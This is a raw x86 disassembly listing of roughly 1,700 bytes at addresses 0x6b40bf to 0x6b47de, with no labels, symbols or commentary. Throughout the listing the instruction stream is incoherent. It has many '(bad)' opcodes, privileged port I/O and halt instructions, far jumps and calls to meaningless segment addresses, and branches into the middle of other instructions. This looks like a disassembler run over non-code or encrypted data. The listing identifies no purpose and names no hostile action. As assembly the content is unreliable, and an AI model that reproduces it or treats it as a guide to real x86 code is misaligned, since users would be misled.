  6b40bf:	shl    DWORD PTR ds:0x52a13f98,0xb8
  6b40c6:	ins    DWORD PTR es:[edi],dx
  6b40c7:	mov    al,ds:0x65beda43
  6b40cc:	js     0x6b40c8
  6b40ce:	cli    
  6b40cf:	loop   0x6b40ed
  6b40d1:	adc    BYTE PTR [edx],ah
  6b40d3:	popf   
  6b40d4:	aam    0x80
  6b40d6:	outs   dx,DWORD PTR ds:[esi]
  6b40d7:	ins    BYTE PTR es:[edi],dx
  6b40d8:	xchg   BYTE PTR [edi],cl
  6b40da:	out    0xc2,al
  6b40dc:	mov    ah,BYTE PTR [edx-0x73]
  6b40df:	push   0xffffffe4
  6b40e1:	cld    
  6b40e2:	je     0x6b406b
  6b40e4:	cmp    bl,BYTE PTR [ebx+0x6d]
  6b40e7:	pusha  
  6b40e8:	js     0x6b40cb
  6b40ea:	fcomp  st(0)
  6b40ec:	loopne 0x6b4088
  6b40ee:	hlt    
  6b40ef:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  6b40f1:	sub    edx,DWORD PTR [esi+0x63]
  6b40f4:	out    dx,al
  6b40f5:	and    eax,0x2c6e0a96
  6b40fa:	sub    ah,BYTE PTR [esi-0x4]
  6b40fd:	sbb    cl,cl
  6b40ff:	jo     0x6b4090
  6b4101:	fs es push ebx
  6b4104:	xchg   BYTE PTR [ebx],cl
  6b4106:	es jle 0x6b4151
  6b4109:	(bad)  [ecx+0x3c]
  6b410c:	cmp    bh,0x1d
  6b410f:	dec    esi
  6b4110:	stos   BYTE PTR es:[edi],al
  6b4111:	inc    ebp
  6b4112:	jne    0x6b414c
  6b4114:	sub    cl,BYTE PTR [esi]
  6b4116:	call   0xad3e:0xcac14391
  6b411d:	(bad)  
  6b411e:	aas    
  6b411f:	(bad)  
  6b4120:	cmp    DWORD PTR [edi+ebx*2-0x6ca8631],edi
  6b4127:	scas   eax,DWORD PTR es:[edi]
  6b4128:	icebp  
  6b4129:	sahf   
  6b412a:	mov    edi,0x8e7c869c
  6b412f:	das    
  6b4130:	sar    cl,1
  6b4132:	jmp    0xced5:0xb7412959
  6b4139:	inc    ecx
  6b413a:	stc    
  6b413b:	in     eax,0x84
  6b413d:	jl     0x6b4140
  6b413f:	(bad)  
  6b4141:	cli    
  6b4142:	mov    ecx,0xdc52a426
  6b4147:	jmp    0xdf6:0xb85fe0c2
  6b414e:	jae    0x6b41b4
  6b4150:	jo     0x6b418a
  6b4152:	retf   0x60b
  6b4155:	xor    BYTE PTR [edx-0x64],0xb8
  6b4159:	adc    eax,0x19bc91c4
  6b415e:	jnp    0x6b4160
  6b4160:	in     eax,0x9b
  6b4162:	jmp    0x6b40e5
  6b4164:	sbb    DWORD PTR [esi-0x43],edx
  6b4167:	sti    
  6b4168:	jb     0x6b40f2
  6b416a:	mov    ebx,0xb4ba8172
  6b416f:	mov    ch,0xc8
  6b4171:	push   edi
  6b4172:	push   esp
  6b4173:	and    DWORD PTR [ecx],edi
  6b4175:	push   esp
  6b4176:	jae    0x6b413f
  6b4178:	icebp  
  6b4179:	test   ecx,edi
  6b417b:	out    0x72,eax
  6b417d:	js     0x6b411b
  6b417f:	mov    ecx,0x63d1de80
  6b4184:	in     al,0x76
  6b4186:	daa    
  6b4187:	jo     0x6b4193
  6b4189:	pop    ss
  6b418a:	xor    eax,0x61ce5050
  6b418f:	cmp    BYTE PTR [edi-0x1dad9a87],0xe5
  6b4196:	lock lods eax,DWORD PTR ds:[esi]
  6b4198:	cmp    BYTE PTR [edx+0x1ab3d762],cl
  6b419e:	sbb    eax,0xb53db96
  6b41a3:	lods   eax,DWORD PTR ds:[esi]
  6b41a4:	dec    edi
  6b41a5:	loope  0x6b4193
  6b41a7:	cs add eax,0xf41f9aec
  6b41ad:	popa   
  6b41ae:	in     eax,0x12
  6b41b0:	data16 stos BYTE PTR es:[edi],al
  6b41b2:	mov    ds:0x74d0f8b8,al
  6b41b7:	cwde   
  6b41b8:	and    edi,DWORD PTR [ebx+0x4429e84d]
  6b41be:	sbb    eax,0x44e91966
  6b41c3:	jnp    0x6b415e
  6b41c5:	and    esp,DWORD PTR [eiz*4+0x1636643e]
  6b41cc:	into   
  6b41cd:	mov    DWORD PTR [ebx-0xd64377],edi
  6b41d3:	push   es
  6b41d4:	call   0xd49e41a2
  6b41d9:	pop    es
  6b41da:	mov    bl,0xc3
  6b41dc:	scas   al,BYTE PTR es:[edi]
  6b41dd:	rcl    BYTE PTR ss:[ebp-0x6a],0x91
  6b41e2:	mov    al,0x14
  6b41e4:	sub    edi,esi
  6b41e6:	rol    BYTE PTR [edi],0xa1
  6b41e9:	inc    edx
  6b41ea:	adc    eax,0xc41014c8
  6b41ef:	in     eax,dx
  6b41f0:	loope  0x6b41ca
  6b41f2:	sub    BYTE PTR [ebx+edx*2],ch
  6b41f5:	ficom  DWORD PTR [ebp+0x2571f754]
  6b41fb:	jp     0x6b41a6
  6b41fd:	popa   
  6b41fe:	into   
  6b41ff:	sti    
  6b4200:	or     al,0xbe
  6b4202:	mov    WORD PTR [ebx+0x57313d68],fs
  6b4208:	and    bl,BYTE PTR [ecx-0x42]
  6b420b:	inc    ecx
  6b420c:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  6b420e:	int    0x47
  6b4210:	in     al,dx
  6b4211:	or     ebp,eax
  6b4213:	lods   al,BYTE PTR ds:[esi]
  6b4214:	mov    al,ds:0x70ffc49a
  6b4219:	fmul   st,st(1)
  6b421b:	push   ds
  6b421c:	aad    0xe
  6b421e:	sbb    bh,BYTE PTR [eax+eax*2]
  6b4221:	jmp    0x6b41ad
  6b4223:	scas   al,BYTE PTR es:[edi]
  6b4224:	adc    eax,ecx
  6b4226:	jmp    0x5e49:0x99f91084
  6b422d:	add    al,0x51
  6b422f:	adc    ch,BYTE PTR [eax+0x2c]
  6b4232:	mov    ?,WORD PTR [edx+0x5f]
  6b4235:	outs   dx,DWORD PTR ds:[esi]
  6b4236:	call   0x8be781bb
  6b423b:	mov    al,ds:0xcc878cd5
  6b4240:	jmp    0xbda0e09f
  6b4245:	into   
  6b4246:	push   ss
  6b4247:	stos   DWORD PTR es:[edi],eax
  6b4248:	jmp    0x6b4293
  6b424a:	sbb    BYTE PTR [edi+edx*8],cl
  6b424d:	addr16 mov ah,0xe5
  6b4250:	neg    DWORD PTR [edx-0x3d220f4c]
  6b4256:	push   ecx
  6b4257:	push   ds
  6b4258:	pop    ds
  6b4259:	mov    eax,ds:0x98c85309
  6b425e:	ja     0x6b42b8
  6b4260:	inc    edx
  6b4261:	adc    ebx,DWORD PTR [eax]
  6b4263:	sub    eax,0xc8ad4ab2
  6b4268:	pop    eax
  6b4269:	push   cs
  6b426a:	jge    0x6b4252
  6b426c:	rcl    BYTE PTR [eax-0x23f5394c],0x69
  6b4273:	and    eax,ecx
  6b4275:	adc    edi,ebp
  6b4277:	inc    ecx
  6b4278:	(bad)  
  6b4279:	int3   
  6b427a:	mov    eax,ds:0xe4690e3d
  6b427f:	adc    edx,esi
  6b4281:	xchg   esp,eax
  6b4282:	inc    ebx
  6b4283:	ins    DWORD PTR es:[edi],dx
  6b4284:	dec    esi
  6b4285:	pop    ss
  6b4286:	clc    
  6b4287:	outs   dx,DWORD PTR ds:[esi]
  6b4288:	(bad)  
  6b4289:	imul   ebp,DWORD PTR [ebp-0x3f99a41f],0x13
  6b4290:	dec    ecx
  6b4291:	lahf   
  6b4292:	stos   BYTE PTR es:[edi],al
  6b4293:	lods   al,BYTE PTR ds:[esi]
  6b4294:	neg    DWORD PTR [ebp+0x29]
  6b4297:	push   edx
  6b4298:	cmp    BYTE PTR [ebp-0x5d],dh
  6b429b:	push   es
  6b429c:	mov    al,0xee
  6b429e:	scas   eax,DWORD PTR es:[edi]
  6b429f:	dec    ecx
  6b42a0:	arpl   WORD PTR [esi-0x3],sp
  6b42a3:	or     al,0x36
  6b42a5:	mov    cl,0x22
  6b42a7:	jecxz  0x6b4256
  6b42a9:	xor    al,0x7b
  6b42ab:	shl    BYTE PTR [ebp-0x57],cl
  6b42ae:	sub    cl,BYTE PTR [ebx]
  6b42b0:	xor    ecx,0xb5f7996e
  6b42b6:	lock push 0x3c
  6b42b9:	popf   
  6b42ba:	mov    BYTE PTR [esi+eax*8+0x46702744],ch
  6b42c1:	inc    ebx
  6b42c2:	out    dx,al
  6b42c3:	cmp    eax,0xfe292f5e
  6b42c8:	aas    
  6b42c9:	inc    ecx
  6b42ca:	popa   
  6b42cb:	or     bl,BYTE PTR fs:[ecx]
  6b42ce:	(bad)  
  6b42cf:	test   al,0xc
  6b42d1:	stc    
  6b42d2:	mov    edi,0xe24a08b8
  6b42d7:	in     al,0x17
  6b42d9:	mov    dl,0x74
  6b42db:	stos   DWORD PTR es:[edi],eax
  6b42dc:	retf   0x9d00
  6b42df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b42e0:	jb     0x6b435e
  6b42e2:	and    ecx,DWORD PTR [edx]
  6b42e4:	push   esp
  6b42e5:	retf   
  6b42e6:	enter  0xebf2,0x8e
  6b42ea:	loopne 0x6b433d
  6b42ec:	imul   ebx,DWORD PTR [ecx],0x5e
  6b42ef:	daa    
  6b42f0:	sti    
  6b42f1:	cmp    al,al
  6b42f3:	push   ds
  6b42f4:	sti    
  6b42f5:	call   0xda9c002d
  6b42fa:	fmulp  st(2),st
  6b42fc:	scas   eax,DWORD PTR es:[edi]
  6b42fd:	push   0x6f
  6b42ff:	popa   
  6b4300:	not    DWORD PTR [ebx+0x254c4ccb]
  6b4306:	rcr    DWORD PTR [edi],cl
  6b4308:	popa   
  6b4309:	sar    BYTE PTR [esi-0x17],1
  6b430c:	out    dx,al
  6b430d:	sub    BYTE PTR [esi+0x7b],dl
  6b4310:	mov    bh,0xad
  6b4312:	nop
  6b4313:	in     al,dx
  6b4314:	mov    ds:0x8a3d8120,al
  6b4319:	mov    es,WORD PTR [esi]
  6b431b:	or     dh,dh
  6b431d:	rcr    DWORD PTR [ecx-0x1b4bf67a],0xef
  6b4324:	push   ss
  6b4325:	popf   
  6b4326:	push   esp
  6b4327:	or     BYTE PTR [ebx+0x3d894e74],bh
  6b432d:	inc    edx
  6b432e:	test   al,cl
  6b4330:	adc    edx,0x8f48e51
  6b4336:	mov    ebp,0x26b4150
  6b433b:	shl    BYTE PTR [bx+si+0x5e30],cl
  6b4340:	jge    0x6b42d5
  6b4342:	adc    eax,0x19ccb791
  6b4347:	fs pop ebx
  6b4349:	repz sub eax,0x2e8e7956
  6b434f:	out    0x4c,al
  6b4351:	sub    esi,ebx
  6b4353:	stos   DWORD PTR es:[edi],eax
  6b4354:	jge    0x6b4348
  6b4356:	jmp    0x6b42e4
  6b4358:	mov    bh,0x1f
  6b435a:	retf   
  6b435b:	pop    eax
  6b435c:	sub    edx,ebx
  6b435e:	fwait
  6b435f:	add    eax,0xe853fb6
  6b4364:	dec    edi
  6b4365:	push   eax
  6b4366:	add    ecx,eax
  6b4368:	sub    edx,esp
  6b436a:	push   edi
  6b436b:	pop    eax
  6b436c:	sbb    ch,bl
  6b436e:	add    al,0xe1
  6b4370:	or     ch,BYTE PTR [ebp+0x1d38fffc]
  6b4376:	cmp    bh,al
  6b4378:	imul   ebp,eax,0xfffffff9
  6b437b:	in     al,dx
  6b437c:	pop    edi
  6b437d:	inc    esi
  6b437e:	and    BYTE PTR [edi+0x65],dh
  6b4381:	popf   
  6b4382:	jns    0x6b4367
  6b4384:	(bad)  
  6b4385:	popf   
  6b4386:	mov    ah,0xbf
  6b4388:	aas    
  6b4389:	int    0x8f
  6b438b:	sbb    eax,0x9c5435c9
  6b4390:	popf   
  6b4391:	jge    0x6b43c2
  6b4393:	push   esp
  6b4394:	imul   eax,DWORD PTR [ecx],0xffffffb5
  6b4397:	mov    ecx,0xec489d7c
  6b439c:	test   eax,0x5a81108f
  6b43a1:	and    DWORD PTR [ecx+0x6c3af434],edx
  6b43a7:	xor    ecx,eax
  6b43a9:	or     eax,0xf31ace83
  6b43ae:	cs add al,0xe2
  6b43b1:	neg    BYTE PTR [edi+ecx*8-0x7d]
  6b43b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b43b6:	push   ds
  6b43b7:	jg     0x6b4412
  6b43b9:	xor    eax,DWORD PTR [edx+0x3d8d9a12]
  6b43bf:	jne    0x6b43a1
  6b43c1:	xchg   ebx,eax
  6b43c2:	aam    0x5
  6b43c4:	into   
  6b43c5:	ins    DWORD PTR es:[edi],dx
  6b43c6:	inc    ebp
  6b43c7:	stos   BYTE PTR es:[edi],al
  6b43c8:	pop    ebx
  6b43c9:	repnz test al,0x6a
  6b43cc:	cmc    
  6b43cd:	dec    ecx
  6b43ce:	imul   eax,DWORD PTR [esp+edx*1-0x44e30a2],0xd71b8116
  6b43d9:	sub    BYTE PTR [esi+0x1c],dl
  6b43dc:	lock stos BYTE PTR es:[edi],al
  6b43de:	xchg   ebp,eax
  6b43df:	ret    
  6b43e0:	jmp    0xde61:0xc671ff09
  6b43e7:	cmp    eax,0x473ee7aa
  6b43ec:	in     al,dx
  6b43ed:	jl     0x6b43a8
  6b43ef:	rcr    BYTE PTR [esi],0x7e
  6b43f2:	imul   eax,ebx,0xffffffac
  6b43f5:	and    dh,BYTE PTR [edi-0x76]
  6b43f8:	and    DWORD PTR ds:0xb6c5cfbd,esi
  6b43fe:	loopne 0x6b4465
  6b4400:	in     al,dx
  6b4401:	lods   eax,DWORD PTR ds:[esi]
  6b4402:	icebp  
  6b4403:	push   DWORD PTR [ebp-0x1f]
  6b4406:	xlat   BYTE PTR ds:[ebx]
  6b4407:	dec    ebp
  6b4408:	lods   eax,DWORD PTR ds:[esi]
  6b4409:	lock rcr BYTE PTR [edi+0x7b],cl
  6b440d:	shr    cl,1
  6b440f:	hlt    
  6b4410:	stos   DWORD PTR es:[edi],eax
  6b4411:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b4412:	cmp    bh,BYTE PTR [esi+0x19]
  6b4415:	cmp    eax,0x93768bc0
  6b441a:	jge    0x6b4413
  6b441c:	dec    edi
  6b441d:	cmp    cl,bl
  6b441f:	inc    ecx
  6b4420:	ret    
  6b4421:	out    dx,al
  6b4422:	aaa    
  6b4423:	in     eax,dx
  6b4424:	scas   eax,DWORD PTR es:[edi]
  6b4425:	xchg   DWORD PTR [esp+ebp*8-0x3c],edx
  6b4429:	push   0x2a5e2825
  6b442e:	test   BYTE PTR [ecx-0x75951636],dl
  6b4434:	in     al,0xee
  6b4436:	aam    0x8d
  6b4438:	add    DWORD PTR [esi],edi
  6b443a:	push   esp
  6b443b:	sub    ah,cl
  6b443d:	sbb    ebx,eax
  6b443f:	mov    ecx,0xff45f3c0
  6b4444:	cld    
  6b4445:	push   ecx
  6b4446:	pop    ds
  6b4447:	bound  esp,QWORD PTR [edx+ebx*2]
  6b444a:	xchg   edx,eax
  6b444b:	mov    ds:0xc1d777e9,al
  6b4450:	push   ds
  6b4451:	pop    ecx
  6b4452:	cmp    ebx,0x0
  6b4455:	mov    cl,0x31
  6b4457:	add    ecx,DWORD PTR [edi]
  6b4459:	add    ah,bh
  6b445b:	pop    ecx
  6b445c:	in     eax,0x94
  6b445e:	mov    BYTE PTR [esi],al
  6b4460:	inc    edx
  6b4461:	cwde   
  6b4462:	adc    edx,DWORD PTR [edi-0x2c]
  6b4465:	mov    ecx,0x80956376
  6b446a:	shr    DWORD PTR [ebp+0x32],0x71
  6b446e:	push   ds
  6b446f:	nop
  6b4470:	cmp    ch,BYTE PTR [ecx-0x6ea4e2bf]
  6b4476:	ror    edx,1
  6b4478:	push   ebp
  6b4479:	push   ebx
  6b447a:	dec    ecx
  6b447b:	hlt    
  6b447c:	scas   eax,DWORD PTR es:[edi]
  6b447d:	ins    BYTE PTR es:[edi],dx
  6b447e:	mov    eax,0x7e54f650
  6b4483:	das    
  6b4484:	enter  0xe859,0x96
  6b4488:	mov    ah,BYTE PTR [edx+0x58907110]
  6b448e:	xchg   DWORD PTR [edi-0x1bcd1b33],ebp
  6b4494:	sbb    bh,BYTE PTR [eax+0x6f9bffc6]
  6b449a:	dec    ecx
  6b449b:	or     bh,BYTE PTR [ebx-0x2f]
  6b449e:	mov    cl,0x52
  6b44a0:	sub    DWORD PTR [eax-0x3c79c553],edi
  6b44a6:	inc    ebp
  6b44a7:	xchg   BYTE PTR [ebp+eiz*1+0x31ab201e],cl
  6b44ae:	jmp    0x6b444b
  6b44b0:	loop   0x6b4443
  6b44b2:	add    al,0xa9
  6b44b4:	scas   eax,DWORD PTR es:[edi]
  6b44b5:	sar    DWORD PTR [ebp+0x6f8a465],1
  6b44bb:	pop    es
  6b44bc:	pop    ebp
  6b44bd:	ret    
  6b44be:	xor    DWORD PTR [esi],edi
  6b44c0:	or     eax,0xbacd4681
  6b44c5:	outs   dx,DWORD PTR ds:[esi]
  6b44c6:	fwait
  6b44c7:	or     al,0xde
  6b44c9:	pop    es
  6b44ca:	and    bl,BYTE PTR [edi+ecx*2]
  6b44cd:	fwait
  6b44ce:	outs   dx,BYTE PTR ds:[esi]
  6b44cf:	dec    ebp
  6b44d0:	test   DWORD PTR [edx+0x42be5c73],0xb1fb6917
  6b44da:	pop    ss
  6b44db:	fild   QWORD PTR [eax]
  6b44dd:	cs mov bl,0x8c
  6b44e0:	not    BYTE PTR [ecx]
  6b44e2:	scas   al,BYTE PTR es:[edi]
  6b44e3:	mov    ch,BYTE PTR [edx-0x16b43762]
  6b44e9:	sbb    eax,0xf558da9
  6b44ee:	cmc    
  6b44ef:	dec    ebp
  6b44f0:	push   es
  6b44f1:	cld    
  6b44f2:	(bad)  ds:0xfd910309
  6b44f8:	rol    edi,cl
  6b44fa:	cmp    BYTE PTR [edi+0x13],bl
  6b44fd:	leave  
  6b44fe:	pop    ds
  6b44ff:	and    bh,BYTE PTR ds:[ecx-0x5]
  6b4503:	dec    ecx
  6b4504:	pop    esi
  6b4505:	out    dx,al
  6b4506:	mov    ah,0xbf
  6b4508:	test   DWORD PTR [ecx+edi*8-0x73],edx
  6b450c:	pop    edi
  6b450d:	mov    al,ds:0x219d71bf
  6b4512:	push   esi
  6b4513:	and    eax,0x8cd31c48
  6b4518:	repz retf 
  6b451a:	in     al,0x7a
  6b451c:	sbb    ch,BYTE PTR [ecx-0x53]
  6b451f:	cmp    BYTE PTR [ebx],cl
  6b4521:	loop   0x6b454c
  6b4523:	dec    edx
  6b4524:	sub    BYTE PTR [esi-0x708b1bde],bh
  6b452a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b452b:	and    BYTE PTR [ecx-0x5e],ch
  6b452e:	test   al,0x90
  6b4530:	ror    BYTE PTR [edx-0x50],0xeb
  6b4534:	pop    ebp
  6b4535:	inc    ecx
  6b4536:	fiadd  DWORD PTR [eax+0x40]
  6b4539:	inc    edx
  6b453a:	call   0xa07d4198
  6b453f:	fisubr WORD PTR [eax+0x30]
  6b4542:	mov    bh,0xb2
  6b4544:	out    0xcb,eax
  6b4546:	(bad)  
  6b4547:	clc    
  6b4548:	cmp    DWORD PTR [ebx-0x80],0xf70e6913
  6b454f:	mov    bh,0x8d
  6b4551:	sub    BYTE PTR [edx],0x1e
  6b4554:	hlt    
  6b4555:	sub    al,0x3f
  6b4557:	inc    eax
  6b4558:	cli    
  6b4559:	add    edi,0xffffffa4
  6b455c:	mov    edi,0xbb82319e
  6b4561:	and    ch,BYTE PTR [esp+ecx*1+0x735ee008]
  6b4568:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b4569:	ror    DWORD PTR [ecx+0x36410555],1
  6b456f:	(bad)  
  6b4571:	jb     0x6b45cf
  6b4573:	or     eax,0xf92c30b0
  6b4578:	shl    DWORD PTR [esi+0x47],0x8a
  6b457c:	jns    0x6b4569
  6b457e:	fst    QWORD PTR [eax-0x6c5871d7]
  6b4584:	out    0x84,al
  6b4586:	jno    0x6b4547
  6b4588:	mov    ebx,0xedeab038
  6b458d:	fld    TBYTE PTR [ecx-0x3d5bd45d]
  6b4593:	mov    esi,0xfb70b411
  6b4598:	sub    bl,BYTE PTR [esi+esi*4]
  6b459b:	ret    
  6b459c:	sub    ebx,DWORD PTR [edi]
  6b459e:	mov    bh,0x70
  6b45a0:	jo     0x6b45d9
  6b45a2:	mov    al,ds:0x64fd592f
  6b45a7:	jge    0x6b4580
  6b45a9:	inc    ecx
  6b45aa:	pop    ecx
  6b45ab:	sahf   
  6b45ac:	ss jmp 0x6b4605
  6b45af:	pusha  
  6b45b0:	cmp    al,0xb6
  6b45b2:	dec    edx
  6b45b3:	inc    ebx
  6b45b4:	inc    DWORD PTR [esi+ebx*2-0x21]
  6b45b8:	xor    ch,BYTE PTR [esi+0x23cd2144]
  6b45be:	dec    ebp
  6b45bf:	repz sub esi,DWORD PTR [ecx-0x4]
  6b45c3:	cmp    al,0xec
  6b45c5:	sbb    eax,0xc88c13d7
  6b45ca:	jo     0x6b4573
  6b45cc:	adc    BYTE PTR [esp+eax*4],bh
  6b45cf:	push   ds
  6b45d0:	leave  
  6b45d1:	cmp    al,0x2c
  6b45d3:	fisub  WORD PTR [ecx+ecx*1]
  6b45d6:	pop    ebp
  6b45d7:	cmp    BYTE PTR [ecx-0x62a9388a],al
  6b45dd:	jle    0x6b4621
  6b45df:	(bad)  
  6b45e0:	jo     0x6b4634
  6b45e2:	retf   
  6b45e3:	(bad)  
  6b45e4:	out    0x10,eax
  6b45e6:	inc    edx
  6b45e7:	pop    ecx
  6b45e8:	push   ecx
  6b45e9:	out    0x80,al
  6b45eb:	sti    
  6b45ec:	push   ebp
  6b45ed:	adc    bl,BYTE PTR [edx-0x1f]
  6b45f0:	xchg   ebp,eax
  6b45f1:	and    eax,0x9545d218
  6b45f6:	adc    esi,DWORD PTR [ebx+eax*8-0x32]
  6b45fa:	and    BYTE PTR [edx],ah
  6b45fc:	mov    esi,0xd08b6017
  6b4601:	add    al,0x2d
  6b4603:	jmp    0x6b45be
  6b4605:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b4606:	jmp    0x626586f0
  6b460b:	xor    ch,dh
  6b460d:	ror    DWORD PTR [eax+eax*2-0x3a],0x49
  6b4612:	into   
  6b4613:	xor    ah,BYTE PTR [edx+0x2d7cc0ac]
  6b4619:	mov    cl,0xb9
  6b461b:	jmp    0xcc:0x811754ff
  6b4622:	ins    DWORD PTR es:[edi],dx
  6b4623:	sub    eax,0x60bd216a
  6b4628:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b4629:	adc    DWORD PTR [esp+edi*1+0x69949b95],ebp
  6b4630:	hlt    
  6b4631:	xor    edi,edi
  6b4633:	rcr    BYTE PTR ds:0xaee3d39c,0x4a
  6b463a:	daa    
  6b463b:	dec    ebx
  6b463c:	es mov al,0x85
  6b463f:	cmp    eax,0xfa6ca1c1
  6b4644:	out    0x18,al
  6b4646:	cdq    
  6b4647:	sub    al,0x27
  6b4649:	push   ebx
  6b464a:	in     eax,0xeb
  6b464c:	daa    
  6b464d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b464e:	jns    0x6b45db
  6b4650:	out    dx,al
  6b4651:	and    DWORD PTR [eax],ecx
  6b4653:	retf   0xf9b7
  6b4656:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b4657:	mov    edi,0x90810b9b
  6b465c:	ret    0x11c0
  6b465f:	add    al,0x78
  6b4661:	inc    ebp
  6b4662:	xchg   ebp,eax
  6b4663:	test   al,0x6b
  6b4665:	inc    ebx
  6b4666:	adc    BYTE PTR [edx+0x48],ah
  6b4669:	enter  0x7ac0,0x8e
  6b466d:	mov    ebp,0x7b788bd0
  6b4672:	jle    0x6b466d
  6b4674:	mov    ah,bh
  6b4676:	xor    eax,0xdb45aa59
  6b467b:	sti    
  6b467c:	cmp    DWORD PTR [ecx-0x1c69ee01],0xec9a39c6
  6b4686:	push   ebp
  6b4687:	ja     0x6b46af
  6b4689:	das    
  6b468a:	push   esi
  6b468b:	mov    edi,0x92085f41
  6b4690:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b4691:	and    BYTE PTR [edi+0xa],dl
  6b4694:	ret    
  6b4695:	fwait
  6b4696:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b4697:	rcr    edx,1
  6b4699:	lods   eax,DWORD PTR ds:[esi]
  6b469a:	fsubrp st(1),st
  6b469c:	fimul  WORD PTR [edi-0xdc3c568]
  6b46a2:	fcmovnb st,st(6)
  6b46a4:	outs   dx,DWORD PTR ds:[esi]
  6b46a5:	arpl   WORD PTR [ecx-0xb],si
  6b46a8:	add    al,0x2c
  6b46aa:	pop    eax
  6b46ab:	imul   ebp,esp,0x70f5d738
  6b46b1:	shl    BYTE PTR [edx+eax*8],cl
  6b46b4:	aam    0xee
  6b46b6:	mov    ch,0xd4
  6b46b8:	pop    ds
  6b46b9:	add    DWORD PTR [esi],esp
  6b46bb:	gs sti 
  6b46bd:	adc    bh,BYTE PTR [edi]
  6b46bf:	scas   al,BYTE PTR es:[edi]
  6b46c0:	push   ds
  6b46c1:	fisttp QWORD PTR [edx+0x2f]
  6b46c4:	pop    esp
  6b46c5:	inc    edx
  6b46c6:	push   ds
  6b46c7:	fmul   QWORD PTR [edi]
  6b46c9:	cmc    
  6b46ca:	mov    dh,0xb8
  6b46cc:	mov    DWORD PTR [ebx+0x46b4f888],esp
  6b46d2:	les    edi,FWORD PTR [edx-0xc4e583c]
  6b46d8:	das    
  6b46d9:	pop    ds
  6b46da:	sub    BYTE PTR [ecx-0x5991309],al
  6b46e0:	into   
  6b46e1:	cwde   
  6b46e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b46e3:	(bad)  
  6b46e4:	cld    
  6b46e5:	mov    eax,0x1bd20928
  6b46ea:	cs mov edi,0x3afc0890
  6b46f0:	test   DWORD PTR [ebx],ebx
  6b46f2:	mov    ch,0x6b
  6b46f4:	in     al,0x2d
  6b46f6:	push   ds
  6b46f7:	es jp  0x6b4752
  6b46fa:	pop    ebp
  6b46fb:	and    BYTE PTR [ecx],dl
  6b46fd:	out    0xaa,al
  6b46ff:	pop    ebp
  6b4700:	cmc    
  6b4701:	push   edi
  6b4702:	adc    al,0x81
  6b4704:	push   es
  6b4705:	add    DWORD PTR [ecx-0x58],ecx
  6b4708:	push   esp
  6b4709:	mov    ecx,DWORD PTR [edi+0x8]
  6b470c:	mov    dh,0x2c
  6b470e:	jbe    0x6b4788
  6b4710:	inc    edx
  6b4711:	(bad)  
  6b4712:	mov    ecx,0xc451ee3d
  6b4717:	mov    bl,0x26
  6b4719:	adc    dh,ch
  6b471b:	adc    eax,DWORD PTR [edx-0x74a9283b]
  6b4721:	adc    bh,ah
  6b4723:	mov    bh,ah
  6b4725:	pop    eax
  6b4726:	pop    edx
  6b4727:	cmp    dl,BYTE PTR [edi+0x19]
  6b472a:	lahf   
  6b472b:	gs ret 
  6b472d:	jmp    0xb80d:0x4ac2578
  6b4734:	test   eax,0xe98f4ee9
  6b4739:	mov    DWORD PTR [eax+ecx*4],ecx
  6b473c:	push   ss
  6b473d:	push   edi
  6b473e:	jo     0x6b4789
  6b4740:	mov    ds:0x9e470f34,eax
  6b4745:	sub    BYTE PTR [edx],0x1a
  6b4748:	jns    0x6b472b
  6b474a:	std    
  6b474b:	adc    eax,0x2c008e48
  6b4750:	or     eax,0xcf803849
  6b4755:	dec    ecx
  6b4756:	push   0x8e073b79
  6b475b:	ds sbb cl,ch
  6b475e:	xor    DWORD PTR [eax],esi
  6b4760:	mov    eax,0xb5dc6636
  6b4765:	gs cmp eax,0xf780ac9d
  6b476b:	fwait
  6b476c:	cmp    DWORD PTR [edx+ecx*2+0x4a1b0681],ebp
  6b4773:	lock adc eax,0xc4026f1d
  6b4779:	adc    dh,bl
  6b477b:	or     cl,bl
  6b477d:	scas   eax,DWORD PTR es:[edi]
  6b477e:	pop    ecx
  6b477f:	pop    edi
  6b4780:	imul   DWORD PTR [edi-0x22]
  6b4783:	pop    ebx
  6b4784:	hlt    
  6b4785:	adc    DWORD PTR [ebx+0x3cdd4b95],ebp
  6b478b:	xchg   ebx,eax
  6b478c:	mov    edx,DWORD PTR [ebp+eiz*2-0x1fdf7c16]
  6b4793:	in     al,dx
  6b4794:	hlt    
  6b4795:	ins    DWORD PTR es:[edi],dx
  6b4796:	out    0x97,eax
  6b4798:	mov    al,bh
  6b479a:	or     eax,0x5602e2d9
  6b479f:	mov    cl,0xc5
  6b47a1:	pop    ecx
  6b47a2:	in     eax,0x9a
  6b47a4:	clc    
  6b47a5:	repz test BYTE PTR [ecx],dh
  6b47a8:	fiadd  WORD PTR [eax]
  6b47aa:	enter  0xd03b,0x1e
  6b47ae:	add    di,0xffe3
  6b47b2:	inc    esi
  6b47b3:	and    DWORD PTR [ebx-0x31],esi
  6b47b6:	pop    ds
  6b47b7:	pop    edx
  6b47b8:	inc    ecx
  6b47b9:	sahf   
  6b47ba:	popa   
  6b47bb:	(bad)  
  6b47bc:	ds pusha 
  6b47be:	arpl   bx,di
  6b47c0:	sahf   
  6b47c1:	push   ebx
  6b47c2:	fmul   st(7),st
  6b47c4:	je     0x6b4765
  6b47c6:	add    al,0xc0
  6b47c8:	push   ebx
  6b47c9:	xor    ecx,DWORD PTR [ecx-0x42b7ae0c]
  6b47cf:	loope  0x6b47dd
  6b47d1:	retf   0x525a
  6b47d4:	out    dx,eax
  6b47d5:	icebp  
  6b47d6:	push   esi
  6b47d7:	sub    esp,DWORD PTR [edi-0x1b]
  6b47da:	inc    esp
  6b47db:	stos   BYTE PTR es:[edi],al
  6b47dc:	fdiv   DWORD PTR [edi]
  6b47de:	test   al,0x86
